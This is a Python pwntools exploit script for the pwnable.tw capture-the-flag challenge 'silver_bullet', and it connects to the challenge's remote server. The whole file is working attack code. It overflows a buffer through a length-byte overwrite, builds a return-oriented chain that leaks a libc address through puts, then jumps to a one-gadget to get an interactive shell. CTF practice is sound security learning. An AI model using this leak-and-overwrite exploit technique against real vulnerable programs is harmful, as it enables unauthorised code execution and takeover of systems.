from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-p', '75']


# io = process(["./x86_ld-2.23.so.2", "./silver_bullet"] ,env={"LD_PRELOAD":"./libc_32.so.6"})

io = remote("chall.pwnable.tw", 10103)

elf = ELF("./silver_bullet")
libc = ELF("./libc_32.so.6")
# libc = elf.libc


def create(io, con):
    io.sendlineafter("Your choice :", '1')
    io.sendafter("Give me your description of bullet :", con)

def power(io, con):
    io.sendlineafter("Your choice :", '2')
    io.sendafter("Give me your another description of bullet :", con)

def beat(io):
    io.sendlineafter("Your choice :", '3')

# gdb.attach(io, "b *0x08048A18")
create(io, 'a'*47)
power(io, 'b')
power(io, b'\xff\xff\xff'+b'a'*4+p32(elf.plt['puts']) + p32(elf.sym['main']) + p32(elf.got['puts']))

beat(io)
io.recvuntil("You win !!\n")

libcaddr = u32(io.recv(4))
libc.address = libcaddr - libc.sym['puts']
system = libc.sym['system']

log.info("libc_base 0x%x", libc.address)
log.info("libcaddr 0x%x", libcaddr)
log.info("system 0x%x", system)

one = [0x3a819, 0x5f065, 0x5f066]

log.info("one 0x%x", libc.address + one[0])

create(io, 'a'*47)
power(io, 'b')
power(io, b'\xff\xff\xff'+b'a'*4+p32(libc.address + one[0]))
beat(io)

io.interactive()